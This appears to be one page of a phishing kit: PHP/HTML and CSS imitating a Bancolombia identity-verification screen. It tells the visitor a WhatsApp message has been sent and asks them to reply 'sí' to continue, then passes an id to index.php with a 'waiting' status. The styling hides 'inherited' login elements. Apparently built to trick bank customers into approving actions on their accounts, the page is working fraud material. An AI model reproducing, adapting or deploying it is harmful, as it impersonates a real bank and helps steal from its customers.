<style>
    /* === ESTILOS BASE Y TEMA OSCURO === */
    body.cc-view {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px 0;
        box-sizing: border-box;
        background-color: #2b2b2b !important;

        /* FONDO RESTAURADO: Ruta relativa desde index.php */
        background-image: url('assets/img/auth-trazo.svg') !important;
        background-size: cover !important;
        background-position: center top -50px !important;
        background-repeat: no-repeat !important;

        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    /* Ocultar elementos heredados del login */
    .cc-view .login-container,
    .cc-view .info-banner,
    .cc-view .background-traces,
    .header,
    .footer {
        display: none !important;
    }

    .card-module {
        background-color: #262626;
        color: #e0e0e0;
        padding: 40px 30px;
        border-radius: 8px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        width: 90%;
        max-width: 380px;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        margin: 0 auto;
        text-align: center;
        position: relative;
        z-index: 100;
    }

    /* === ESTILOS DE WHATSAPP === */
    .whatsapp-icon-container {
        margin-bottom: 25px;
    }

    .whatsapp-icon {
        font-size: 3.5em;
        color: #25D366;
        background: #fff;
        border-radius: 50%;
        padding: 15px;
        width: 80px;
        height: 80px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }

    .wa-title {
        color: #fff;
        font-weight: 700;
        font-size: 1.4em;
        margin-bottom: 20px;
    }

    .wa-box {
        background-color: #333;
        border: 1px solid #404040;
        border-radius: 12px;
        padding: 20px;
        margin-bottom: 30px;
    }

    .wa-text {
        color: #ccc;
        font-size: 0.95em;
        line-height: 1.6;
        margin: 0;
    }

    .wa-highlight {
        color: #fff;
        font-weight: bold;
    }

    /* BOTÓN CORREGIDO */
    .wa-button {
        width: 100%;
        padding: 16px;
        background-color: #f0c300;
        border: none;
        border-radius: 30px;
        color: #222;
        font-size: 1.1em;
        font-weight: 700;
        cursor: pointer;
        display: flex;
        /* Flexbox para centrar contenido */
        align-items: center;
        /* Centrado vertical */
        justify-content: center;
        /* Centrado horizontal */
        text-align: center;
        gap: 10px;
        text-decoration: none;
        transition: transform 0.2s, background-color 0.2s;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        box-sizing: border-box;
    }

    .wa-button:hover {
        background-color: #d4ac00;
        transform: translateY(-2px);
    }

    .wa-button i {
        display: flex;
        align-items: center;
    }

    .wa-footer {
        margin-top: 40px;
        color: #777;
        font-size: 0.85em;
        line-height: 1.6;
    }
</style>

<div class="card-module">
    <div class="whatsapp-icon-container">
        <div class="whatsapp-icon">
            <i class="fa-brands fa-whatsapp"></i>
        </div>
    </div>

    <div class="wa-title">
        Código 923. Valida tu identidad
    </div>

    <div class="wa-box">
        <p class="wa-text">
            Confirma que eres tú. Hemos enviado un WhatsApp, responde con <span class="wa-highlight">"sí"</span> para
            continuar con el proceso.
        </p>
    </div>

    <a href="index.php?status=espera&id=<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>" class="wa-button">
        <i class="fa-regular fa-circle-check"></i>
        Entendido
    </a>

    <div class="wa-footer">
        <p><?php
        setlocale(LC_TIME, 'es_ES.UTF-8', 'es_ES', 'esp');
        echo ucfirst(strftime('%A %d de %B de %Y %I:%M:%S %p'));
        ?></p>
        <p>Copyright © <?php echo date('Y'); ?> Bancolombia.</p>
    </div>
</div>
